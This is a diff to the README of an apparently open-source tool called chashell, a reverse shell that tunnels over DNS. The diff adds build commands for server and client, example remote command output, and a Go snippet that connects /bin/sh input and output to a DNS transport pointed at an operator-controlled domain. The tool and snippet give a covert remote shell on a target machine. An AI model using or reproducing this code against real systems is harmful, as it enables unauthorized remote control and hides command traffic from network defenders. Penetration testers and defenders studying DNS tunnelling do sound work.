@@ -30,7 +30,7 @@ We tested those systems and it works without issues :
 
 #### Building
 
-Build the binaries (change the domain_name and the encryption key) :
+Build all the binaries (change the domain_name and the encryption key) :
 
 
 ```
@@ -39,10 +39,22 @@ $ export DOMAIN_NAME=c.sysdream.com
 $ make build-all
 ```
 
-For building in a specific platform :
+Building for a specific platform :
 
 ```
 $ make build-all OSARCH="linux/arm"
+```
+
+Building the server only :
+
+```
+$ make build-server
+```
+
+Building the client (chashell) only :
+
+```
+$ make build-client
 ```
 
 #### DNS Settings
@@ -70,24 +82,26 @@ ls /
 bin
 boot
 dev
-etc
-home
-lib
-lib64
-media
-mnt
-opt
-proc
-root
-run
-sbin
-srv
-sys
-tmp
+[...]
 usr
 var
 ```
 
 On the server, use the chaserv binary.
 For the client (or the target), use the chashell binary.
+
+## Implement your own
+
+The *chashell/lib/transport* is compatible with the *io.Reader* / *io.Writer* interface. So, implementing a reverse shell is easy as :
+
+```go
+cmd := exec.Command("/bin/sh")
+
+dnsTransport := transport.DNSStream(targetDomain, encryptionKey)
+
+cmd.Stdout = dnsTransport
+cmd.Stderr = dnsTransport
+cmd.Stdin = dnsTransport
+cmd.Run()
+```
 
